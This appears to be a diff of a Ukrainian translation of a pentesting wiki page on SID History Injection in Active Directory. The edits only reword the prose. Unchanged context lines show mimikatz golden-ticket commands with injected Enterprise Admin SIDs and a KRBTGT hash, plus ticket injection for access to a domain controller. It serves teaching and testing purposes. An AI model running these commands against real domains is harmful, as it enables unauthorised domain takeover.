@@ -4,7 +4,7 @@
 
 ## SID History Injection Attack
 
-Основна мета **SID History Injection Attack** полягає в допомозі **міграції користувачів між доменами**, забезпечуючи при цьому безперервний доступ до ресурсів з попереднього домену. Це досягається шляхом **включення попереднього Ідентифікатора Безпеки (SID) користувача в SID History** їх нового облікового запису. Варто зазначити, що цей процес можна маніпулювати для надання несанкціонованого доступу, додаючи SID групи з високими привілеями (такої як Enterprise Admins або Domain Admins) з батьківського домену до SID History. Це використання надає доступ до всіх ресурсів у батьківському домені.
+Основна мета **SID History Injection Attack** полягає в допомозі **міграції користувачів між доменами**, забезпечуючи при цьому безперервний доступ до ресурсів з попереднього домену. Це досягається шляхом **включення попереднього Ідентифікатора Безпеки (SID) користувача в SID History** їх нового облікового запису. Варто зазначити, що цей процес може бути маніпульований для надання несанкціонованого доступу шляхом додавання SID групи з високими привілеями (такої як Enterprise Admins або Domain Admins) з батьківського домену до SID History. Це використання надає доступ до всіх ресурсів у батьківському домені.
 
 Існує два методи для виконання цієї атаки: через створення або **Golden Ticket**, або **Diamond Ticket**.
 
@@ -33,7 +33,7 @@ mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid
 # The previous command will generate a file called ticket.kirbi
 # Just loading you can perform a dcsync attack agains the domain
 ```
-Для отримання додаткової інформації про золоті квитки перегляньте:
+Для отримання додаткової інформації про золоті квитки перевірте:
 
 {{#ref}}
 golden-ticket.md
@@ -59,7 +59,7 @@ diamond-ticket.md
 .\kirbikator.exe lsa .\CIFS.mcorpdc.moneycorp.local.kirbi
 ls \\mcorp-dc.moneycorp.local\c$
 ```
-Ескалюйте до DA кореневого або Enterprise admin, використовуючи хеш KRBTGT скомпрометованого домену:
+Ескалація до DA кореневого або корпоративного адміністратора, використовуючи хеш KRBTGT скомпрометованого домену:
 ```bash
 Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-211874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'
 
